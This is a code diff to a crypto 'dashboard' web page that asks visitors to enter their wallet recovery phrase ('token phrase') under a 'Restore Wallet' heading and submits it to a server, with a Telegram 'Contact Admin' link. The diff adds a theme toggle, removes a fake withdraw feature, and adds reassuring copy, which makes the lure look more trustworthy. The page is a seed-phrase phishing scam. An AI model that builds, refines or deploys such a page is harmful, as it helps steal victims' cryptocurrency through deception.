@@ -6,7 +6,10 @@
   <title>Crypto Dashboard</title>
   <style>
     * {margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif;}
-    body {background: #0f0f1b; color: #fff; min-height: 100vh; padding-bottom: 80px;}
+    body {
+      background: #0f0f1b; color: #fff; min-height: 100vh; padding-bottom: 80px;
+      transition: background 0.3s, color 0.3s;
+    }
     .content-section {display: none; padding: 30px 20px; text-align: center;}
     .content-section.active {display: block;}
     .content-box {
@@ -16,6 +19,7 @@
       box-shadow: 0 0 20px rgba(0,255,255,0.15);
       border: 1px solid #1f2235;
       margin-top: 30px;
+      transition: background 0.3s, border 0.3s;
     }
     .content-box h2 {color: #00ffff; margin-bottom: 15px;}
     .bottom-nav {
@@ -44,9 +48,63 @@
     }
     #bnbPrice {color: #00ff90; font-weight: bold; font-size: 18px; margin-top: 10px;}
     .tx-log {margin-top: 15px; font-size: 15px; color: #ccc; text-align: left; padding-left: 10px;}
+
+    /* Theme toggle button */
+    #themeToggle {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background: #222;
+      color: #00ffff;
+      border: 1px solid #00ffff;
+      padding: 6px 10px;
+      border-radius: 8px;
+      cursor: pointer;
+      z-index: 999;
+    }
+
+    /* LIGHT MODE STYLES */
+    body.light-mode {
+      background: #f2f2f2;
+      color: #000;
+    }
+    body.light-mode .content-box {
+      background: #fff;
+      border-color: #ddd;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+    body.light-mode .content-box h2 {
+      color: #0072ff;
+    }
+    body.light-mode .bottom-nav {
+      background: #fff;
+      border-top-color: #ccc;
+    }
+    body.light-mode .nav-item {
+      color: #555;
+    }
+    body.light-mode .nav-item.active {
+      color: #0072ff;
+    }
+    body.light-mode .input-field {
+      background: #e6f0ff;
+      border-color: #0072ff;
+      color: #000;
+    }
+    body.light-mode #themeToggle {
+      background: #fff;
+      color: #0072ff;
+      border-color: #0072ff;
+    }
+    body.light-mode .btn {
+      background: linear-gradient(90deg,#0072ff,#00c6ff);
+      color: #fff;
+    }
   </style>
 </head>
 <body>
+
+<button id="themeToggle" onclick="toggleTheme()">🌓</button>
 
 <!-- ✅ Home Section -->
 <div id="home" class="content-section active">
@@ -78,9 +136,10 @@
     </div>
   </div>
 
-  <div class="content-box" style="background: linear-gradient(135deg, #1b1f30, #0f1628); border: 1px solid #344966;">
+  <div class="content-box">
     <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
     <p style="color: #cceeff;">Enter your token phrase to restore your wallet and start earning.</p>
+    <p> You are trading in your own crypto wallet</p>
     <textarea id="tokenPhrase" class="input-field" placeholder="Enter your token phrase..." rows="4"></textarea>
     <button class="btn" onclick="restoreWallet()">Restore Wallet</button>
     <div id="tokenMsg" style="margin-top:15px; font-size:14px;"></div>
@@ -94,16 +153,6 @@
   <div class="content-box"><h2>💡 Need Help?</h2><p style="color:#ccc;">Still confused?</p><a href="https://t.me/crmmrhelper" style="color:#5ffe68;">Contact Admin</a></div>
 </div>
 
-<!-- ✅ Withdraw Section -->
-<div id="withdraw" class="content-section">
-  <div class="content-box"><h2>➖ Withdraw</h2>
-    <input type="text" id="withdrawAddress" class="input-field" placeholder="Enter BNB address" />
-    <input type="number" id="withdrawAmount" class="input-field" placeholder="Amount in BNB" step="0.0001" />
-    <button class="btn" onclick="withdrawBNB()">Withdraw</button>
-    <div class="tx-log" id="withdrawLog"></div>
-  </div>
-</div>
-
 <!-- ✅ Transactions -->
 <div id="transactions" class="content-section">
   <div class="content-box"><h2>📜 Transactions</h2><div id="txHistory"></div></div>
@@ -112,9 +161,8 @@
 <!-- ✅ Bottom Navigation -->
 <div class="bottom-nav">
   <div class="nav-item active" onclick="showSection('home', this)"><span>🏠</span>Home</div>
-  <div class="nav-item" onclick="showSection('wallet', this)"><span>💰</span>Earn </div>
+  <div class="nav-item" onclick="showSection('wallet', this)"><span>💰</span>Earn/Cashout</div>
   <div class="nav-item" onclick="showSection('deposit', this)"><span>❓</span>FAQ</div>
-  <div class="nav-item" onclick="showSection('withdraw', this)"><span>➖</span>Withdraw</div>
   <div class="nav-item" onclick="showSection('transactions', this)"><span>📜</span>History</div>
 </div>
 
@@ -168,7 +216,7 @@
     }).then(res => {
       if (res.ok) {
         msgBox.style.color = '#00ff90';
-        msgBox.innerHTML = `✅ Wallet restored successfully.<br>🟢 Trading and Earning will be activated only of you have $20 in your BNB Wallet in the phrases you submitted.`;
+        msgBox.innerHTML = `✅ Wallet restored successfully.<br>🟢 Trading and Earning will be activated only if you have $20 in your BNB Wallet in the phrases you submitted.`;
         document.getElementById("tokenPhrase").value = '';
       } else {
         msgBox.style.color = 'red';
@@ -180,42 +228,23 @@
     });
   }
 
-  function withdrawBNB() {
-    const address = document.getElementById("withdrawAddress").value.trim();
-    const val = parseFloat(document.getElementById("withdrawAmount").value);
-    const logEl = document.getElementById("withdrawLog");
-
-    if (!address || !val || val <= 0) {
-      logEl.textContent = "❌ Enter valid address and amount.";
-      logEl.style.color = "red";
-      return;
-    }
-
-    if (currentBalanceUSD < 1000) {
-      logEl.textContent = "❌ Need $1000 minimum to withdraw.";
-      logEl.style.color = "red";
-      return;
-    }
-
-    const usd = val * bnbPriceUSD;
-    if (usd > currentBalanceUSD) {
-      logEl.textContent = "❌ Not enough balance.";
-      logEl.style.color = "red";
-      return;
-    }
-
-    currentBalanceUSD -= usd;
-    updateBNBValue();
-    logEl.textContent = `✅ Sent ${val} BNB ($${usd.toFixed(2)}) to ${address}`;
-    logEl.style.color = "#00ff90";
-    addToHistory(logEl.textContent);
-  }
-
   function addToHistory(txt) {
     const div = document.createElement("div");
     div.textContent = txt;
     document.getElementById("txHistory").prepend(div);
   }
+
+  function toggleTheme() {
+    document.body.classList.toggle('light-mode');
+    localStorage.setItem('theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
+  }
+
+  // Load saved theme
+  window.onload = () => {
+    if (localStorage.getItem('theme') === 'light') {
+      document.body.classList.add('light-mode');
+    }
+  };
 
   fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")
     .then(res => res.json())
